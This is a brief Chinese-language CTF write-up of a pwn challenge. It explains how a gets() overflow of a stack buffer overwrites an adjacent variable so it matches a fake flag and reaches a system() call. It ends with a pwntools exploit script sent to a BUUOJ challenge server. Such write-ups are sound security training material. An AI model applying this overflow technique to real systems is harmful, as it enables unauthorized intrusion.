checksec看到保护全开

![image-20210410205054652](https://static.hack1s.fun/images/2021/04/10/image-20210410205054652.png)

看到IDA反编译代码

![image-20210410204948406](https://static.hack1s.fun/images/2021/04/10/image-20210410204948406.png)

这里的gets肯定是有可能溢出的，另外这里的check比较变量v5是否和fake_flag相等，相等就通过检查调用system

![image-20210410205109055](https://static.hack1s.fun/images/2021/04/10/image-20210410205109055.png)

所以思路应该是想要溢出v4修改变量v5

直接可以看到v4在rbp-0x70

v5在rbp-0x40

所以payload

```python
from pwn import *

io = remote('node3.buuoj.cn',26043)
payload = b'a'*0x30 + b"n0t_r3@11y_f1@g"
io.send(payload)
io.interactive()
```

